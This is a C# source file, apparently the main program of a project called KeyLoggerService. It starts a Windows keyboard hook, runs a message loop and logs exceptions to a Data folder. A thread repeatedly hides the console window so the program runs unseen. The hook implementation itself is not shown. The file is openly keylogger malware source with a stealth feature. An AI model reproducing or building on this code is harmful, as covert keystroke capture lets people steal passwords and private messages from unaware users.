using KeyLoggerService.HookSetting;
using KeyLoggerService.HookSetting.HookManager;
using KeyLoggerService.Service;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using System.Runtime.InteropServices;
using System.Windows.Forms;
internal class Program
{
    private static readonly string ProjDirectory = Directory.GetCurrentDirectory();

    private static async Task Main(string[] args)
    {
        var keyHookSet = new KeyHookSet();
        Directory.CreateDirectory(Path.Combine(ProjDirectory, "Data"));


        var thread = new Thread(HideConsole,Int32.MaxValue);
        thread.Start();

        try
        {
            keyHookSet.Start();
            Application.Run();

        }
        catch (Exception ex)
        {
            await File.AppendAllTextAsync(
                Path.Combine(AppContext.BaseDirectory, "Data", "ExeptionLog.txt"),
                $"[{DateTime.Now}]  --  {ex.Message}  --  {ex.StackTrace}");
            await keyHookSet.ShutdownHook();
            throw;
        }
    }


    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    private static void HideConsole()
    {
        var handle = GetConsoleWindow();
        while (true)
        {
            ShowWindow(handle, SW_HIDE);
        }
    }
}